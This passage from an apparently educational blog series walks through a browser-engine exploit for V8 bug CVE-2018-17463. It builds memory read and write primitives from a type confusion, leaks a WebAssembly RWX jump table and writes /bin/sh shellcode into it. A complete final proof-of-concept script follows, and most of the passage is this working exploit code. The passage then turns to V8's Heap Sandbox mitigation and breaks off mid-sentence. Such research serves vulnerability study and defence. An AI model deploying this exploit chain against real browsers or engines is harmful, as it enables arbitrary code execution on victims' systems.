class="hljs-keyword">let</span> memory = {  addrOf(obj) {    <span class="hljs-comment">// Set object address to new out-of-line property called leakme</span>    arrBuf2.leakMe = obj;    <span class="hljs-comment">// Use read64 primitive to leak the properties backing store address of our array buffer</span>    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-comment">// Read offset 16 from the array buffer backing store and return the address of our object</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};</code></pre><p>Using this technique we can finally leak the <code>wasmInstance</code> address and the RWX jump table pointer for that instance.</p><h2 id="1-3-RCE-PoC"><a href="#1-3-RCE-PoC" class="headerlink" title="1.3. RCE PoC"></a>1.3. RCE PoC</h2><p>Now let&#x2019;s combine everything we&#x2019;ve covered so far.</p><h3 id="1-Build-primitives"><a href="#1-Build-primitives" class="headerlink" title="[1] Build primitives"></a>[1] Build primitives</h3><p>Find the address of the second <code>ArrayBuffer</code> with <code>addrOf</code>, change the <code>backing_store</code> pointer of the first buffer to point to the second buffer&#x2019;s address, and then build memory read/write primitives from that.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>)<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1)<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>]<span class="hljs-comment">// Construct Memory Primitives via Array Buffers</span><span class="hljs-keyword">let</span> memory = {  write(addr, bytes) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);    view2.set(bytes);  },  read64(addr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];  },  write64(addr, ptr) {    view1[<span class="hljs-number">4</span>] = addr;    <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);    view2[<span class="hljs-number">0</span>] = ptr;  },  addrOf(obj) {    arrBuf2.leakMe = obj;    <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;  }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);</code></pre><h3 id="2-Create-a-WebAssembly-instance"><a href="#2-Create-a-WebAssembly-instance" class="headerlink" title="[2] Create a WebAssembly instance"></a>[2] Create a WebAssembly instance</h3><p>This wasm code block compiles a simple &#x201C;dummy function&#x201D; into JIT memory. When the instance is created, an internal <strong>RWX jump table</strong> is allocated. We can later overwrite that RWX memory with shellcode and execute it.</p><pre><code class="hljs jsx">print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-comment">// Generate RWX region for Shellcode via WASM</span><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;</code></pre><h3 id="3-Leak-the-RWX-jump-table-pointer"><a href="#3-Leak-the-RWX-jump-table-pointer" class="headerlink" title="[3] Leak the RWX jump-table pointer"></a>[3] Leak the RWX jump-table pointer</h3><p>Using our primitive, obtain the wasm instance&#x2019;s address and the jump-table start pointer.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);</code></pre><h3 id="4-Inject-shellcode"><a href="#4-Inject-shellcode" class="headerlink" title="[4] Inject shellcode"></a>[4] Inject shellcode</h3><p>Read the jump-table pointer at offset <code>0xf0</code> from the <code>wasmInstance</code> object to obtain the RWX address. Use <code>read64</code> to get the executable address, then write your shellcode there.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table Start Pointer</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Prepare Calc Shellcode</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0x48</span>,...print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode to Jump Table Start Address</span>memory.write(wasmRWXAddr, shellcode);</code></pre><h3 id="5-Call-the-wasm-function-to-execute-the-shellcode"><a href="#5-Call-the-wasm-function-to-execute-the-shellcode" class="headerlink" title="[5] Call the wasm function to execute the shellcode"></a>[5] Call the wasm function to execute the shellcode</h3><p>Finally, call the wasm function (<code>main</code>). Since the jump table now points to our shellcode, invoking the function will execute it.</p><pre><code class="hljs jsx"><span class="hljs-comment">// Execute our Shellcode</span>print(<span class="hljs-string">&quot;[+] Popping Calc...&quot;</span>);func();</code></pre><p>This completes the chain from a JavaScript-initiated bug to native code execution.</p><p>Below is the final PoC reflecting the above steps.</p><blockquote><p>As mentioned in Part 1, these tests were performed on Linux. To port the PoC from Windows to Linux you only need to change the shellcode. I replaced the Windows calc shellcode with a shell-launching shellcode and executed it on Linux.</p></blockquote><pre><code class="hljs jsx"><span class="hljs-comment">// Conversion Buffers</span><span class="hljs-keyword">let</span> floatView = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(<span class="hljs-number">1</span>);<span class="hljs-keyword">let</span> uint64View = <span class="hljs-keyword">new</span> BigUint64Array(floatView.buffer);<span class="hljs-built_in">Number</span>.prototype.toBigInt = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toBigInt</span>(<span class="hljs-params"></span>) </span>{    floatView[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> uint64View[<span class="hljs-number">0</span>];};BigInt.prototype.toNumber = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toNumber</span>(<span class="hljs-params"></span>) </span>{    uint64View[<span class="hljs-number">0</span>] = <span class="hljs-built_in">this</span>;    <span class="hljs-keyword">return</span> floatView[<span class="hljs-number">0</span>];};<span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeObj</span>(<span class="hljs-params">pValues</span>) </span>{    <span class="hljs-keyword">let</span> obj = {        inline: <span class="hljs-number">1234</span>    };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {            writable: <span class="hljs-literal">true</span>,            value: pValues[i]        });    }    <span class="hljs-keyword">return</span> obj;}<span class="hljs-comment">// Function to find overlapping properties</span><span class="hljs-keyword">let</span> p1, p2;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlappingProperties</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">let</span> pNames = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;    }    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            <span class="hljs-subst">${pNames.map((p) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${p}</span> = obj.<span class="hljs-subst">${p}</span>;`</span>).join(<span class="hljs-string">&apos;\n&apos;</span>)}</span></span><span class="hljs-string">            return [<span class="hljs-subst">${pNames.join(<span class="hljs-string">&apos;, &apos;</span>)}</span>];</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {        pValues[i] = -i;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {                [p1, p2] = [i, -res[i]];                <span class="hljs-keyword">return</span>;            }        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;}<span class="hljs-comment">// Return address of an object as a BigInt</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params">obj</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            return obj.p<span class="hljs-subst">${p1}</span>.x1;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    pValues[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p2] = { <span class="hljs-attr">y</span>: obj };    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>;        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>;}<span class="hljs-comment">// Function to write data to obj address</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, newValue</span>) </span>{    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span><span class="hljs-string">        function vuln(obj) {</span><span class="hljs-string">            obj.inline;</span><span class="hljs-string">            this.Object.create(obj);</span><span class="hljs-string">            let orig = obj.p<span class="hljs-subst">${p1}</span>.x2;</span><span class="hljs-string">            obj.p<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${newValue.toNumber()}</span>;</span><span class="hljs-string">            return orig;</span><span class="hljs-string">        }</span><span class="hljs-string">    `</span>);    <span class="hljs-keyword">let</span> pValues = [];    <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">13.37</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">13.38</span> };    pValues[p1] = o;    pValues[p2] = obj;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {        o.x2 = <span class="hljs-number">13.38</span>;        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.38</span>) {            <span class="hljs-keyword">return</span> res.toBigInt();        }    }    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] fakeObj Primitive Failed&quot;</span>;}<span class="hljs-comment">// Find Overlapping Properties</span>print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);findOverlappingProperties();print(<span class="hljs-string">`[+] Properties p<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);<span class="hljs-comment">// Create Array Buffers</span><span class="hljs-keyword">let</span> arrBuf1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-keyword">let</span> arrBuf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);<span class="hljs-comment">// Leak Address of arrBuf2</span>print(<span class="hljs-string">&quot;[+] Leaking ArrayBuffer Address...&quot;</span>);<span class="hljs-keyword">let</span> arrBuf2Addr = addrOf(arrBuf2);print(<span class="hljs-string">`[+] ArrayBuffer Address @ 0x<span class="hljs-subst">${arrBuf2Addr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-comment">// Corrupt Backing Store Pointer of arrBuf1</span>print(<span class="hljs-string">&quot;[+] Corrupting ArrayBuffer Backing Store...&quot;</span>);<span class="hljs-keyword">let</span> originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);<span class="hljs-comment">// Store Original Backing Store Pointer of arrBuf2</span><span class="hljs-keyword">let</span> view1 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf1);<span class="hljs-keyword">let</span> originalArrBuf2BackingStore = view1[<span class="hljs-number">4</span>];<span class="hljs-comment">// Memory Read and Write Primitives</span><span class="hljs-keyword">let</span> memory = {    write(addr, bytes) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(arrBuf2);        view2.set(bytes);    },    read64(addr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        <span class="hljs-keyword">return</span> view2[<span class="hljs-number">0</span>];    },    write64(addr, ptr) {        view1[<span class="hljs-number">4</span>] = addr;        <span class="hljs-keyword">let</span> view2 = <span class="hljs-keyword">new</span> BigUint64Array(arrBuf2);        view2[<span class="hljs-number">0</span>] = ptr;    },    addrOf(obj) {        arrBuf2.leakMe = obj;        <span class="hljs-keyword">let</span> props = <span class="hljs-built_in">this</span>.read64(arrBuf2Addr + <span class="hljs-number">8n</span>) - <span class="hljs-number">1n</span>;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.read64(props + <span class="hljs-number">16n</span>) - <span class="hljs-number">1n</span>;    }};print(<span class="hljs-string">&quot;[+] Constructed Memory Read and Write Primitive!&quot;</span>);<span class="hljs-comment">// Generate RWX region via WASM</span>print(<span class="hljs-string">&quot;[+] Generating a WebAssembly Instance...&quot;</span>);<span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule);<span class="hljs-keyword">var</span> func = wasmInstance.exports.main;<span class="hljs-comment">// Leak WebAssembly Instance Address and Jump Table</span>print(<span class="hljs-string">&quot;[+] Leaking WebAssembly Instance Address...&quot;</span>);<span class="hljs-keyword">let</span> wasmInstanceAddr = memory.addrOf(wasmInstance);print(<span class="hljs-string">`[+] WebAssembly Instance Address @ 0x<span class="hljs-subst">${wasmInstanceAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);<span class="hljs-keyword">let</span> wasmRWXAddr = memory.read64(wasmInstanceAddr + <span class="hljs-number">0xF0n</span>);print(<span class="hljs-string">`[+] WebAssembly RWX Jump Table Address @ 0x<span class="hljs-subst">${wasmRWXAddr.toString(<span class="hljs-number">16</span>)}</span>`</span>);print(<span class="hljs-string">&quot;[+] Preparing Shellcode...&quot;</span>);<span class="hljs-comment">// Linux x64 Shellcode to execute /bin/sh</span><span class="hljs-keyword">let</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([    <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>,                   <span class="hljs-comment">// push 59 (syscall number for execve)</span>    <span class="hljs-number">0x58</span>,                         <span class="hljs-comment">// pop rax</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>,            <span class="hljs-comment">// xor rdx, rdx (envp = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>,            <span class="hljs-comment">// xor rsi, rsi (argv = NULL)</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// movabs rdi, &quot;/bin/sh\x00&quot;</span>    <span class="hljs-number">0x57</span>,                         <span class="hljs-comment">// push rdi</span>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>,            <span class="hljs-comment">// mov rdi, rsp</span>    <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>                    <span class="hljs-comment">// syscall</span>]);print(<span class="hljs-string">&quot;[+] Writing Shellcode to Jump Table Address...&quot;</span>);<span class="hljs-comment">// Write Shellcode</span>memory.write(wasmRWXAddr, shellcode);print(<span class="hljs-string">&quot;[+] Spawning Shell...&quot;</span>);<span class="hljs-comment">// Execute Shellcode</span>func();</code></pre><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><p>Because this exploit writes shellcode into a wasm instance&#x2019;s jump table in memory, porting the payload to Linux involved only changing the shellcode. I replaced the calc payload with a shell spawner and ran it successfully on Linux.</p><ul><li>Windows</li></ul><p><img src="image%203.png" alt="image.png"></p><ul><li>Linux</li></ul><p><img src="image%204.png" alt="image.png"></p><h2 id="1-4-Summary"><a href="#1-4-Summary" class="headerlink" title="1.4 Summary"></a>1.4 Summary</h2><p>We&#x2019;ve now made it to Part 4, and since it&#x2019;s been quite a long journey, let&#x2019;s take a moment to summarize before moving on! (There&#x2019;s still more ahead &#x1F60E;)</p><p>In <strong>Part 1</strong>, we covered the foundational concepts necessary to understand Chrome&#x2019;s internal architecture and the V8 engine.</p><p>In <strong>Part 2</strong>, we discussed the concept of <strong>Type Confusion</strong> &#x2014; why it happens when the JavaScript engine misinterprets internal types, and what security risks it introduces.</p><p>In <strong>Parts 3 through 4 (so far)</strong>, we took a deep dive into how Type Confusion can be leveraged to build <strong>read/write primitives</strong>, and how those primitives evolve into a <strong>full exploit chain</strong>.</p><p>Modern browsers operate using multiple processes and complex memory structures to support their wide range of features. This architecture gives attackers numerous potential vectors to target, and by chaining those vectors together, they can gain the ability to read or write arbitrary data in the heap.</p><p>This research post focused on one such vector &#x2014; <strong>Type Confusion</strong> &#x2014; showing how it can be exploited to manipulate memory and ultimately achieve <strong>remote code execution (RCE)</strong>.</p><p>From a technical standpoint, the exploit for <strong>CVE-2018-17463</strong> can be thought of as consisting of two major phases:</p><ol><li><strong>Vulnerability &#x2192; Primitive Construction Phase:</strong><br>This phase involves analyzing the Type Confusion bug and crafting reliable <strong>memory read/write primitives</strong>. It&#x2019;s primarily about understanding the root cause of the bug and the inner workings of the JavaScript engine.</li><li><strong>Primitive &#x2192; Code Execution (Weaponization / Pwn) Phase:</strong><br>In this phase, the attacker uses the acquired primitives to target <strong>executable memory (RWX)</strong> and run arbitrary code. This step belongs more to the traditional <strong>pwnable/exploit engineering</strong> domain.</li></ol><p>In other words, when viewed through the lens of <strong>CVE-2018-17463</strong>, everything up to the creation of the memory read/write primitives belongs to <strong>vulnerability and engine-level research</strong>, while overwriting the <strong>Wasm instance jump table</strong> to trigger actual RCE falls under <strong>pwnable exploitation</strong>.</p><p>Now, if you&#x2019;ve studied pwnable before, you might already know what usually follows such an exploit&#x2026;</p><p>That&#x2019;s right &#x2014; <strong>mitigation</strong>&#x1F62D;</p><p><del>(As someone studying vulnerabilities, I can&#x2019;t decide whether to laugh or cry &#x1F602;)</del></p><p>In V8, optimizations that occur independently of the developer&#x2019;s intentions can often lead to bugs like Type Confusion. Because this happened far too frequently, <strong>V8 introduced a new mitigation called the Heap Sandbox in early 2020</strong>.</p><p>Let&#x2019;s continue and explore what <strong>Heap Sandbox</strong> is, and how it mitigates these attacks! &#x314E;.&#x314E;</p><h1 id="2-V8-Heap-Sandbox"><a href="#2-V8-Heap-Sandbox" class="headerlink" title="2. V8 Heap Sandbox"></a>2. V8 Heap Sandbox</h1><p>In Chapter 2, &#x201C;sandbox&#x201D; doesn&#x2019;t mean Chrome&#x2019;s process sandbox but rather the heap sandbox inside the renderer &#x2014; i.e., the V8 heap sandbox.</p><h2 id="2-1-Motivation"><a href="#2-1-Motivation" class="headerlink" title="2.1 Motivation"></a>2.1 Motivation</h2><p><img src="image%205.png" alt="image.png"></p><p>For several years before the sandbox, over 60% of Chrome exploits started in V8, but many of those weren&#x2019;t classic memory bugs (UAF, OOB). They were subtle logical bugs in the JIT compiler or runtime &#x2014; or memory corruptions caused by such logic bugs. These aren&#x2019;t problems you can eliminate just by writing &#x201C;better&#x201D; code, because the compiler itself becomes an attack surface. V8 therefore needed a tailored defensive layer that prevents memory corruption in the heap from immediately compromising the rest of the process &#x2014; that is the core goal of the <strong>V8 Heap Sandbox</strong>.</p><p>Put it simply, the goal is to ensure that <strong>even if a vulnerability causes an arbitrary value (especially a pointer) to be written, that value cannot immediately take over the engine&#x2019;s control 